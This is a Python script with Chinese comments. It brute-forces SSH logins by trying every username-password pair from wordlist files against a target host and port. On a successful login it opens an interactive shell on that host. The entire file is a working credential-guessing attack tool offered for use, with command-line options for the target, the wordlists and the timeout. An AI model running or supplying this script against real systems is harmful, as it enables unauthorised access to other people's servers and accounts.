# -*- coding: utf-8 -*-
import paramiko
import interactive
import optparse
from threading import *
from time import *
import threading
TIMEOUT = 1
UNFILE = './username_list.txt'
PWFILE = './password_list.txt'
usernames = []
passwords = []


"""重新定义带返回值的线程类"""
class MyThread(threading.Thread):
    def __init__(self,func,args=()):
        super(MyThread,self).__init__()
        self.func = func
        self.args = args
    def run(self):
        self.result = self.func(*self.args)
    def get_result(self):
        try:
            return self.result
        except Exception:
            return None

# 锁屏幕 保证一次尝试输出不会错乱 （其实在这个脚本里没有太大必要，在涉及多线程并且多输出的时候效果显著）
screenLock = Semaphore(value=1)
# 记录日志 （ssh会话日志，非爆破日志）
paramiko.util.log_to_file('./log.txt')

# 建立ssh连接 返回 paramiko.SSHClient()对象 或者 None
def login(Ip, Port, Username, Password, timeout):
    try:
        screenLock.acquire() # 锁定屏幕
        print('[-] try login:', Username, '@', Password)
        global ssh
        ssh=paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(Ip,port=Port,username=Username,password=Password,compress=True,timeout=timeout) # normally port = 22
        print('[+] password found! ---(username@passowrd) :',Username,'@',Password)
        return ssh
    except:
        ssh.close()
    screenLock.release() # 解锁屏幕
    return None

# 加载密码用户名列表
def load(unfile, pwfile):
    try:
        f = open(unfile,'r')
        for un in f.readlines():
            un = un[0:-1]   # 切除回车
            usernames.append(un)
        f = open(pwfile,'r')
        for pw in f.readlines():
            pw = pw[0:-1]
            passwords.append(pw)
    except Exception as e:
        print(e)

# 连接 依赖同文件夹下的interactive.py
def connect(ssh):
    #建立交互式shell连接
    channel=ssh.invoke_shell()
    #建立交互式管道
    interactive.interactive_shell(channel)
    #关闭连接
    channel.close()
    ssh.close()
    return

def main():
    # 命令解析
    parser = optparse.OptionParser('Usage %prog '+ '-H <host_ip> -p <Post>')
    parser.add_option('-H', dest='tgtHost', type='string',help='target host ip')
    parser.add_option('-p', dest='tgtPort', type='int',help='target host port')
    parser.add_option('--uf', dest='usernames_file', type='string',help='usernames file, txt is adapted')
    parser.add_option('--pf', dest='passwords_file', type='string',help='passwords file, txt is adapted')
    parser.add_option('--timeout', dest='timeout', type='int',help='set timeout defalut 1')
    (options,args) = parser.parse_args()
    Ip = options.tgtHost
    Port = options.tgtPort
    # 如果给定了这两个参数就使用，否则就使用默认值
    unfile = UNFILE
    pwfile = PWFILE
    timeout = TIMEOUT
    if options.usernames_file != None:
        unfile = options.usernames_file
    if options.passwords_file != None:
        pwfile = options.passwords_file
    if options.timeout != None:
        timeout = options.timeout
    # 载入用户名和密码列表
    load(unfile,pwfile)
    # 线程爆破
    threads = [] # 线程池
    ssh = None # 保存线程返回的会话
    for Username in usernames:
        for Password in passwords:
            t = MyThread(func=login, args=(Ip,Port,Username,Password,timeout))
            threads.append(t)
    # 开启线程
    for i in range(len(usernames)*len(passwords)):
        threads[i].start()
        threads[i].join()
        if threads[i].get_result() != None:
            ssh = threads[i].get_result()
            break
    if ssh == None:
        pass
    else:
        ch = input("[+] 是否进入shell？(Y/n)")
        if ch == 'n':
            pass
        else:
            connect(ssh)
    print("[-] Done at ",ctime())
    return

if __name__ == '__main__':
    main()